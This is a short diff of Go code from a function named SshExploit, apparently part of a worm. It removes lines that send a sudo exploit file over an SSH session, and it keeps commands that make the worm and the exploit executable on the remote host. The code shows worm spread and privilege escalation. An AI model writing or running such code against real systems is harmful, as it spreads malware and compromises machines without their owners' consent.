@@ -162,9 +162,6 @@ func SshExploit(ip string) string {
 	}
 	defer session.Close()
 
-	var exploit []byte
-	exploit = GetFile(worm_dir + "/" + sudo_exploit_filename)
-	session.Stdin = bytes.NewReader(exploit)
 	session.CombinedOutput(
 		"chmod u+x " + worm_dir + "/worm && " +
 		"chmod u+x " + worm_dir + "/" + sudo_exploit_filename + " && " +
